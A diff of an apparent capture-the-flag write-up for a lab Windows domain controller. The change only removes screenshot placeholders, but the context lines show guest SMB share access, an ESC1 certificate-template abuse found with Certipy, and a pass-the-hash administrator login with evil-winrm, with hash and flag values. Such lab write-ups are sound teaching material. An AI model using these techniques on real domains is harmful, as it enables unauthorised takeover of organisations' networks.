@@ -371,11 +371,6 @@
 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 60020/tcp open  msrpc         Microsoft Windows RPC</code></pre>
-    <div class="shot">
-        <img src="retro_01.png" alt="nmap scan identifying the Windows Domain Controller"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_01.png</code><br>nmap scan identifying the Windows Domain Controller</div>
-    </div>
     <h3>Analyzing the Scan Results</h3>
     <p>The open ports indicate this is a Windows Domain Controller (DNS, Kerberos, MSRPC, SMB, LDAP/LDAPS, RDP). Key findings: Domain retro.vl, Hostname DC, OS Windows Server 2022 (Build 20348), FQDN DC.retro.vl.</p>
     <pre><code>echo "10.129.234.44 DC.retro.vl retro.vl DC" | sudo tee -a /etc/hosts</code></pre>
@@ -391,11 +386,6 @@ SMB  10.129.234.44  445  DC  SYSVOL                   Logon server share
 SMB  10.129.234.44  445  DC  Trainees    READ</code></pre>
     <div class="highlight">
     <p><strong>Key finding:</strong> The guest account has READ access to the Trainees share! This is unusual and worth investigating.</p>
-    </div>
-    <div class="shot">
-        <img src="retro_02.png" alt="netexec guest share enumeration showing Trainees READ"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_02.png</code><br>netexec guest share enumeration showing Trainees READ</div>
     </div>
     <h3>Exploring the Trainees Share</h3>
     <pre><code>smbclient //10.129.234.44/Trainees -U 'Guest'
@@ -462,11 +452,6 @@ SMB  ...  [+] retro.vl\BANKING$:0xdf0xdf</code></pre>
   [!] Vulnerabilities
     ESC1 : 'RETRO.VL\Domain Computers' can enroll, enrollee supplies
            subject and template allows client authentication</code></pre>
-    <div class="shot">
-        <img src="retro_03.png" alt="Certipy find output flagging the ESC1 vulnerable template"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_03.png</code><br>Certipy find output flagging the ESC1 vulnerable template</div>
-    </div>
     <h3>Understanding ESC1</h3>
     <p>ESC1 lets the requester supply the subject (Enrollee Supplies Subject = True), the cert allows Client Authentication, and low-privileged users (Domain Computers) can enroll. As <code>BANKING$</code> we can request a certificate claiming to be for "administrator" and authenticate as them.</p>
     <h3>Requesting a Certificate</h3>
@@ -482,11 +467,6 @@ aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</code></pre>
     <h2>Getting an Administrator Shell</h2>
     <pre><code>evil-winrm -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre>
-    <div class="shot">
-        <img src="retro_04.png" alt="Evil-WinRM session as administrator (pass-the-hash)"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_04.png</code><br>Evil-WinRM session as administrator (pass-the-hash)</div>
-    </div>
     <h3>Retrieving the Root Flag</h3>
     <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 40fce9c3f09024bcab29d377ee1ed071</code></pre>
